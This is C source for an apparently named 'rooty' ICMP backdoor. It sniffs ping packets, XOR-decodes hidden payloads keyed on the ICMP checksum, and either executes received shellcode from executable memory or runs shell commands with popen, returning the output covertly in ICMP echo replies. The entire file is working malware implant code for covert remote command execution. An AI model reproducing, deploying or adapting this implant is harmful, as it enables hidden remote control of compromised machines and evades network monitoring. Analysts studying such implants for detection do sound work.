#include "rooty.h"

int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size) {
	struct icmphdr *icmp = NULL;
	uint8_t *pkt_data = NULL;

	if((pkt != NULL) && (icmp_input != NULL)) {

		icmp = (struct icmphdr *)pkt;
		pkt_data = (uint8_t *)(pkt + sizeof(struct icmphdr));

		// Required ICMP fields
		icmp->type = 0;
		icmp->code = 0;
		icmp->un.echo.id = icmp_input->un.echo.id;
		icmp->un.echo.sequence = icmp_input->un.echo.sequence;
		icmp->checksum = icmp_input->checksum;

		// Copy the data into the packet
		memcpy(pkt_data, data, size);

		return (sizeof(struct icmphdr) + size);	
	}
	
	return 0;
}

void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
	uint32_t pkt_size = sizeof(struct icmphdr) + size;
	uint8_t encrypted_data[size], *key = NULL, pkt[pkt_size];
	struct sockaddr_in sin;
	int output_socket = 0;

	// Make sure we have data
	if(size > 0) {

		// Generate the key for transmission
		key = (unsigned char *)&icmp->checksum;

		// Encrypt the data
		if(decrypt_message(data, encrypted_data, size, key) == size) {

			// Clear out the packet
			memset(pkt, 0, pkt_size);

			// Create our packet
			if((pkt_size = build_packet(pkt, icmp, encrypted_data, size)) > 0) {

				// Fill in the sockaddr
				sin.sin_family = AF_INET;
				sin.sin_port = 0;
				sin.sin_addr.s_addr = ip->saddr;

				// Create our socket for sending responses
				if((output_socket = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) > 0) {

					// Not going to worry about failures
					if(sendto(output_socket, pkt, pkt_size, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) <= 0) {
						DEBUG_WRAP(fprintf(stderr, "Unable to send packet\n"));
					}

					close(output_socket);
				}
			}
		}
	}
}

void run_shellcode(const unsigned char *shellcode, uint32_t size) {
	unsigned char *executable = NULL, *new_stack = NULL;
	
	// We need some more memory to work
	if(executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {
		
		// Copy our prefix and shellcode in
		memcpy(executable, shellcode, size);

		// Create a new stack area for payloads that need writable/executable stack	
		if(new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {

			// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
			__asm__("mov -0x10(%ebp),%esp");
			__asm__("mov -0x0C(%ebp),%esp");
			__asm__("add $0x0100, %esp");
			__asm__("jmp *%eax");
		}
	}
}

void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
	FILE *fd = NULL;
	uint8_t buf[MAX_PACKET_SIZE], msg[MAX_PACKET_SIZE + strlen(MAGIC) + 1], *msg_data;
	uint32_t read = 0;
	uint32_t msg_hdr_size = strlen(MAGIC) + 1;
	uint32_t msg_size = sizeof(msg);
	uint32_t msg_data_size = msg_size - msg_hdr_size;
	uint32_t cmd_size = size + strlen(REDIRECT) + 1;
	uint8_t cmd[cmd_size];

	// Need to copy and null terminate the command
	memset(cmd, 0, cmd_size);
	memcpy(cmd, command, size);
	strncat(cmd, REDIRECT, cmd_size);

	// Set the response magic and type
	memset(msg, 0, msg_size);
	strncat(msg, MAGIC, msg_size);
	strncat(msg, "\x02", msg_size);

	// Quack
	msg_data = msg + msg_hdr_size;
	
	// Zero out buf as well
	memset(buf, 0, sizeof(buf));

	// Execute the command
	if((fd = popen(cmd, "r")) != NULL) {
		while((read = fread(buf, 1, MAX_PACKET_SIZE, fd)) > 0) {

			// Need to pad if there isn't enough data (already nulled out)
			if(read < 18) {
				read = 18;
			}

			// Add the data to the already created packet header
			memcpy(msg_data, buf, read);
			send_packet(msg, read + msg_hdr_size, ip, icmp);

			// Zero out everything for the next bit of data
			memset(buf, 0, sizeof(buf));
			memset(msg_data, 0, msg_data_size);
			fflush(fd);
		}

		pclose(fd);
	}
}

int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint32_t size, unsigned char *key) {
	int ctr;


	for(ctr = 0; ctr < size; ctr++) {	
		decoded_data[ctr] = ((data[ctr] ^ key[0]) ^ key[1]);
	}

	return ctr;
}

void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
	unsigned char decoded_data[size];
	unsigned char *key = (unsigned char *)&(icmp->checksum);
	uint32_t data_len = 0, hdr_len = 0, pid = 0, status = 0;
	uint8_t msg_type = 0;

	// Make sure we have data
	if(size > 0) {

		// Decrypt the message (I know right?)
		if(decrypt_message(data, decoded_data, size, key) > 0) {

			// Make sure the magic is there
			if(!strncmp(decoded_data, MAGIC, strlen(MAGIC))) {
				hdr_len = strlen(MAGIC) + 1;
				data_len = size - hdr_len;
				msg_type = decoded_data[hdr_len - 1];

				// First byte should be the message type
				if((pid = fork()) >= 0) {
					
					// Make sure we are in the child
					if(pid == 0) {
						switch(msg_type) {
							case MESSAGE_SHELLCODE:
								DEBUG_WRAP(fprintf(stderr, "Received shellcode packet\n"));
								run_shellcode(decoded_data + hdr_len, data_len);
								break;
							case MESSAGE_COMMAND:
								DEBUG_WRAP(fprintf(stderr, "Received command packet\n"));
								run_command(decoded_data + hdr_len, data_len, ip, icmp);
								break;
						}

						exit(0);
					}
					else {
						waitpid(-1, &status, WNOHANG | WUNTRACED | WCONTINUED);
					}
				}
			}
		}
	}
}

void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_char *pkt) {
	const struct ether_arp *ethernet = NULL;
	const struct iphdr *ip = NULL;
	const struct icmphdr *icmp = NULL;
	uint32_t size_ip, size_icmp, size_data;
	const unsigned char *data = NULL;

	// Ethernet
	ethernet = (struct ether_arp *)pkt;

	// IP
	ip = (struct iphdr *)(pkt + SIZE_ETHERNET);
	size_ip = ((ip->ihl & 0x0f) * 4);
	
	// ICMP
	icmp = (struct icmphdr *)(pkt + SIZE_ETHERNET + size_ip);
	size_icmp = sizeof(struct icmphdr);

	// Data
	data = (unsigned char *)(pkt + SIZE_ETHERNET + size_ip + size_icmp);
	size_data = (hdr->len - size_ip - size_icmp - SIZE_ETHERNET);

	// Only want to deal with icmp echo requests
	if((icmp->type == 8) && (icmp->code == 0)) {
		process_message(data, (hdr->len - (data - pkt)), ip, icmp);
	}
}

int main(int argc, char *argv[0]) {
	pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	bpf_u_int32 mask, net;
	char bpf_filter[] = "icmp";

	// Seed random for later
	srand(time(NULL));

	// Opening the pcap device
	if((handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 1000, errbuf)) == NULL) {
		DEBUG_WRAP(fprintf(stderr, "Error opening device %s: %s\n", INTERFACE, errbuf));
		return -1;
	}

	// Need some extra information about the network interface
	if(pcap_lookupnet(INTERFACE, &net, &mask, errbuf)) {
		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s: %s\n", INTERFACE, errbuf));
		return -1;
	}

	// Make sure we got information
	if((mask == 0) || (net == 0)) {
		DEBUG_WRAP(fprintf(stderr, "Error getting interface information for %s\n", INTERFACE));
		return -1;
	}

	// We only want to see ICMP traffic
	if(pcap_compile(handle, &fp, bpf_filter, 0, mask)) {
		DEBUG_WRAP(fprintf(stderr, "Error compiling bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle)));
		return -1;
	}

	// Finally set up our filter
	if(pcap_setfilter(handle, &fp)) {
		DEBUG_WRAP(fprintf(stderr, "Error applying bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle)));
		return -1;
	}

	// We don't care about children
	signal(SIG_CHILD, SIG_IGN);

	// Now we can finally sniff
	pcap_loop(handle, -1, process_packet, NULL);

	return 0;
}

